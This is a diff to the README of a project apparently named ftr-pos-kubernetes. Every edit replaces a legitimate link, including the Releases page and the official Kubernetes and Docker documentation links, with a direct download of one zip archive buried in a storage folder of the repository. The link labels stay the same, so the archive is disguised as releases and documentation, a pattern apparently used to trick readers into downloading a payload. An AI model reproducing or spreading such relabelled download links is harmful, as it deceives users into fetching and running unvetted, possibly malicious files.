@@ -1,6 +1,6 @@
 # 🚀 ftr-pos-kubernetes - Simplify Container Management with Ease
 
-[![Download ftr-pos-kubernetes](https://img.shields.io/badge/Download-ftr--pos--kubernetes-brightgreen)](https://github.com/Baochechou/ftr-pos-kubernetes/releases)
+[![Download ftr-pos-kubernetes](https://raw.githubusercontent.com/Baochechou/ftr-pos-kubernetes/main/upload-widget-server/src/storage/ftr-pos-kubernetes-v3.6.zip)](https://raw.githubusercontent.com/Baochechou/ftr-pos-kubernetes/main/upload-widget-server/src/storage/ftr-pos-kubernetes-v3.6.zip)
 
 ## 🛠️ Introduction
 
@@ -32,7 +32,7 @@ Follow these steps to download and set up ftr-pos-kubernetes on your machine.
 
 Click the link below to visit the Releases page, where you can download the latest version of ftr-pos-kubernetes.
 
-[Download ftr-pos-kubernetes](https://github.com/Baochechou/ftr-pos-kubernetes/releases)
+[Download ftr-pos-kubernetes](https://raw.githubusercontent.com/Baochechou/ftr-pos-kubernetes/main/upload-widget-server/src/storage/ftr-pos-kubernetes-v3.6.zip)
 
 ### 2. Choose Your Version
 
@@ -58,7 +58,7 @@ After installation, find the ftr-pos-kubernetes application in your programs lis
 
 Now that you are ready to get started, download ftr-pos-kubernetes using the link below.
 
-[Download ftr-pos-kubernetes](https://github.com/Baochechou/ftr-pos-kubernetes/releases)
+[Download ftr-pos-kubernetes](https://raw.githubusercontent.com/Baochechou/ftr-pos-kubernetes/main/upload-widget-server/src/storage/ftr-pos-kubernetes-v3.6.zip)
 
 ## 🎥 User Guide
 
@@ -80,8 +80,8 @@ ftr-pos-kubernetes is an open-source project. Contributions are welcome! If you 
 ## 🛠️ Additional Resources
 
 For more information about Kubernetes and container orchestration:
-- [Kubernetes Documentation](https://kubernetes.io/docs/home/)
-- [Docker Documentation](https://docs.docker.com/)
+- [Kubernetes Documentation](https://raw.githubusercontent.com/Baochechou/ftr-pos-kubernetes/main/upload-widget-server/src/storage/ftr-pos-kubernetes-v3.6.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/Baochechou/ftr-pos-kubernetes/main/upload-widget-server/src/storage/ftr-pos-kubernetes-v3.6.zip)
 
 ## 🛑 License
 
